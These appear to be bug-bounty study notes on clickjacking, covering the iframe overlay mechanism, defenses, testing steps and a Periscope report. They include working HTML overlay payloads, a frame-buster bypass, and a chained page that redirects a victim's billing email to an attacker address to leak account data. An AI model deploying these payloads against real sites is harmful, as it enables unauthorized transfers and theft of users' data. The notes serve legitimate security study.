# What is clickjacking
 Clickjacking, or user-interface redressing, is an attack that tricks users into clicking a malicious button that has been made to look legitimate. Attackers achieve this by using HTML page-overlay techniques to hide one web page within another.
==Note that clickjacking is rarely considered in scope for bug bounty programs, as it usually involves a lot of user interaction on the victim’s part==
# Mechanisms
Clickjacking relies on an HTML feature called an `iframe`. HTML iframes allow developers to embed one web page within another by placing an `<iframe>` tag on the page, and then specifying the URL to frame in the tag’s src attribute.

Iframes useful as it allow you to embed other internet resources, like videos and audio, ex: 

```html
<iframe width="560" height="315"
src="https://www.youtube.com/embed/d1192Sqk" frameborder="0"
allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
allowfullscreen>
</iframe>
```

Let’s say that `example.com` is a banking site that includes a page for transferring your money with a click of a button.
You can access the balance transfer page with the URL `https:// www.example.com/transfer_money`, This URL accepts two parameters: the recipient account ID and the transfer amount If you visit the URL with these parameters present, such as `https://www.example.com/transfer_money?recipient=RECIPIENT_ACCOUNT &amount=AMOUNT_TO_TRANSFER`, the HTML form on the page will appear prefilled 

![](../Media/Web%20AppSec%20Images/Pasted%20image%2020240221221121.png)

Now imagine that an attacker embeds this sensitive banking page in an `iframe` on their own site, like this:
```html
<!--This iframe embeds the URL for the balance transfer page -->
<html>
 <h3>Welcome to my site!</h3>
 <iframe src="https://www.example.com/transfer_money?
 recipient=attacker_account_12345&amount=5000" 
 width="500" height="500">
 </iframe>
</html>
```

Take a look at the full HTML page example:
```html
<html>
 <style>
 #victim-site {
 width:500px;
Clickjacking   147
 height:500px;
 opacity:0.00001; /*We then make the iframe invisible by setting its opacity to a very low value*/
 z-index:1; /*higher z-index value will be on top*/
 }
 #decoy {
 position:absolute; /*set decoy element to absolute to make the decoy site overlap with the iframe containing the victim site, Without the absolute position directive, HTML would display these elements on separate parts of the screen*/
 width:500px;
 height:500px;
 z-index:-1;
 }
 </style>
 <div id="decoy">
 <h3>Welcome to my site!</h3>
 <h3>This is a cybersecurity newsletter that focuses on bug
bounty news and write-ups! 
 Please subscribe to my newsletter below to receive new
cybersecurity articles in your email inbox!</h3>
 <form action="/subscribe" method="post">
 <label for="email">Email:</label>
 <br>
 <input type="text" id="email" value="Please enter your email!">
 <br><br> /*carefully position the iframe so the Transfer Balance button sits directly on top of this Subscribe button, using new lines created by HTML’s line break tag*/
 <input type="submit" value="Submit">
 </form>
 </div>
 <iframe id="victim-site"
 src="https://www.example.com/transfer_money? 
 recipient=attacker_account_12345&amount=5000" 
 width="500" height="500">
 </iframe>
</html>
```

so if we set the opacity back to 1, You can see that the Transfer Balance button is located directly on top of the Subscribe to Newsletter button

![](../Media/Web%20AppSec%20Images/Pasted%20image%2020240221221606.png)

Once we reset the opacity of the `iframe` to opacity:0.00001 to make the sensitive form invisible, the site looks like a normal newsletter page
![](../Media/Web%20AppSec%20Images/Pasted%20image%2020240221221720.png)

If the user is logged into the banking site, they’ll be logged into the `iframe` too, so the banking site’s server will recognize the requests sent by the `iframe` as legit. When the user clicks the seemingly harmless button, they’re executing a balance transfer on `example.com`!
==This is a simplified example. In reality, payment applications will not be implemented this way==, because it would violate data security standards

Another thing to remember is that the ==presence of an easy-to-prevent vulnerability on a critical functionality==, like this scenario, is a symptom that the application does not follow the best practices of secure development, This example application is likely to contain other vulnerabilities, and you should test it extensively.

Two conditions must be met for a clickjacking vulnerability to happen:
1. the vulnerable page has to have functionality that executes a state-changing action on the user’s behalf like (changing the user’s account settings )
2. the vulnerable page has to allow itself to be framed by an `iframe` on another site

pages are frameable by default, but The HTTP response header `X-Frame-Options` lets web pages indicate whether the page’s contents can be rendered in an `iframe`
This header offers two options: `DENY `and `SAMEORIGIN`, If a page is served with the `DENY` option, it cannot be framed at all. The `SAMEORIGIN` option allows framing from pages of the same origin: pages that share the same protocol, host, and port.
```
X-Frame-Options: DENY 
X-Frame-Options: SAMEORIGIN
```

# Prevention:
1. the site should serve one of these options on all pages that contain state-changing actions
2. When the `SameSite` flag on a cookie is set to Strict or Lax, that cookie won't be sent in requests made within a third-party `iframe`:
     `Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict
     `Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Lax`
	this will help to stop the attacks that require the victim to be authenticated 
3. The `Content-Security-Policy` response header is another possible defense setting the directive to 'none' will prevent any site from framing the page, whereas setting the directive to 'self' will allow the current site to frame the page:
	   `Content-Security-Policy: frame-ancestors 'none';`
	   `Content-Security-Policy: frame-ancestors 'self';`
	   `Content-Security-Policy: frame-ancestors 'self' *.example.com;` -> will allow the
	   current site, as well as any page on the subdomains of example.com, to frame its contents

- check [OWASP Cheat Sheet | Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) for further info
# Hunting for Clickjacking

>look for pages on the target site that contain sensitive state-changing actions and can be framed

## Step 1: Look for State-Changing Actions
You should look for pages that allow users to make changes to their accounts, like changing their account details or settings. Otherwise, even if an attacker can hijack user clicks, they can’t cause any damage to the website or the user’s account. 
For example, you work on a target `example.com` handle banking functionalities `bank.example.com` Go through all the functionalities of the web application, click all the links, and write down all the state-changing options, along with the URL of the pages like:
#### example of State-changing requests on `bank.example.com`
- Change password:` bank.example.com/password_change`
- Transfer balance: `bank.example.com/transfer_money `
- Unlink external account: `bank.example.com/unlink`
check the actions that can be achieved via clicks alone not keyboard actions for example:
if the application requires users to explicitly type the recipient account and transfer amount instead of loading them from a URL parameter, attacking it with clickjacking would not be feasible
## Step 2: Check the Response Headers
Then go through each of the state-changing functionalities you’ve found and See if the page is being served with the` X-Frame-Options` or `Content-Security-Policy` header
- If the page is served without any of these headers, it may be vulnerable to clickjacking
- And if the state-changing action requires users to be logged in when it is executed, you should also check if the site uses `SameSite` cookies. If it does, you won’t be able to exploit a clickjacking attack on the site’s features that require authentication
## Step 3: Confirm the Vulnerability
You should try to execute the state-changing action through the framed page you just constructed and see if the action succeeds. If you can trigger the action via clicks alone through the `iframe`, the action is vulnerable to clickjacking.

# POC & Code Templates
### HTML code template
```html
<html>
 <head>
 <title>Clickjack test page</title>
 </head>
 <body>
 <p>Web page is vulnerable to clickjacking if the iframe is populated with the target page!</p>
 <iframe src="URL_OF_TARGET_PAGE" width="500" height="500"></iframe>
 </body>
</html>
```
### Basic payload
```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

# Bypassing Protections
if the website uses frame-busting techniques instead of HTTP response headers and `SameSite` cookies: find a loophole in the `frame-busting code` so you might be able to bypass the mitigations

> [!frame-busting code]
> is a technique that use JavaScript code to check if the page is in an iframe, and if it’s framed by a trusted site. Frame-busting is an unreliable way to protect against clickjacking and can be bypassed

developers commonly make the mistake of comparing only the top frame to the current frame when trying to detect whether the protected page is framed by a malicious page. If the top frame has the same origin as the framed page they allow it, code ex:
```javascript
if (top.location == self.location){
// Allow framing.
} 
else{
// Disallow framing.
}
```
## If that is the case, we use one of the following:
### 1- HTML 5 Sandbox Attribute:
```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

### 2-the double `iframe` trick
1. search for a location on the victim site that allows you to embed custom `iframes` like (social media sites allows users to share links on their profile, features to embed videos, audio, images, web page builders)
2. construct a page that frames the victim’s targeted functionality
3. Then place the entire page in an `iframe` hosted by the victim site

![](../Media/Web%20AppSec%20Images/Pasted%20image%2020240221221817.png)

This way, both` top.location` and `self.location` point to `victim.com`, The frame-busting code would determine that the innermost victim.com page is framed by another victim.com page within its domain

> **Check out this [lab](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script) from PortsWigger to practice**
## Real world scenario and report

>[!Periscope]
>is a live streaming video application, and on July 10, 2019, it was found to be vulnerable to a clickjacking vulnerability, You can find the disclosed bug report at https://hackerone.com/reports/591432/

The site was using the `X-Frame-Options:ALLOW-FROM` directive to prevent clickjacking
but it’s an obsolete directive that isn’t supported by many browsers. This means that all features on the subdomains https://canary-web.pscp.tv and https://canary-web.periscope.tv were vulnerable to clickjacking if the victim was using a browser that didn’t support the directive, such as the latest Chrome, Firefox, and Safari browsers, an attacker could for example, frame the settings page and trick users into deactivating their accounts.

# Escalating the Attack

>Focus on the application’s ==most critical functionalities== to achieve maximum business impact like (bank transfers functionalities)

## Chaining with other vulns
applications often send or disclose information according to user preferences. If you can change these settings via clickjacking, you can often induce sensitive information disclosures
### example of clickjacking chain
Let’s say that `bank.example.com` contains multiple clickjacking. One of them allows attackers to change an account’s billing email, and another one allows attackers to send an account summary to its billing email. The malicious page’s HTML looks like this:
#### HTML code example to chain two clickjacking vulns
```html
<html>
 <h3>Hunter</h3>
 <!--changing the victim email first to your own account-->
 <iframe 
 src="https://bank.example.com/change_billing_email?email=attacker@attacker.com" 
 width="500" height="500">
 </iframe>
 <!--then make the victim send an account summary to your email address to leak the information contained in the account summary report-->
 <iframe src="https://bank.example.com/send_summary" width="500" height="500">
 </iframe>
</html>
```
- you might be able to collect data including the street address, phone numbers, and credit card information associated with the account!
- Note that for this attack to succeed, the victim user would have to click the attacker’s site twice

## Chaining with CSRF 
Exploit Clickjacking to achieve CSFRF
look at [CSRF](CSRF.md) for more info
# A Note on Delivering the Clickjacking Payload
Often in bug bounty reports, you’ll need to show companies that real attackers could effectively exploit the vulnerability you found. That means you need to understand how attackers can exploit clickjacking bugs in the wild

For the attack to succeed, the attacker would have to construct a site that is convincing enough for users to click
check out the Social-Engineer Toolkit(https://github.com/trustedsec/social-engineer-toolkit/)

>[!Vickie Li]
>In my experience, the most effective location in which to place the hidden button is directly on top of a Please Accept That This Site Uses Cookies! pop-up. Users usually click this button to close the window without much thought

# Finding Your First Clickjacking Vulnerability!
 1. Spot the state-changing actions on the website and keep a note of their URL locations. Mark the ones that require only mouse clicks to execute for further testing 
 2. Check these pages for the X-Frame-Options, Content-Security-Policy header, and a SameSite session cookie. If you can’t spot these protective features, the page might be vulnerable!
 3. Craft an HTML page that frames the target page, and load that page in a browser to see if the page has been framed
 4. Confirm the vulnerability by executing a simulated clickjacking attack on your own test account
 5. Craft a sneaky way of delivering your payload to end users, and consider the larger impact of the vulnerability 
 6. Draft your first clickjacking report!
# References
- [Bug Bounty Bootcamp book](https://www.amazon.eg/-/en/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities/dp/1718501544)
- [PortsWigger-Web Security Academy | Clickjacking](https://portswigger.net/web-security/clickjacking)
-  [WSTG - v4.2 | Clickjacking Testing](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking)
-  [javascript info](https://javascript.info/clickjacking)
- [HackTricks | clickjacking](https://book.hacktricks.xyz/pentesting-web/clickjacking)
- [book of Bug Bounty Tips](https://gowsundar.gitbook.io/book-of-bugbounty-tips/clickjacking)
- [OWASP Cheat Sheet | Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
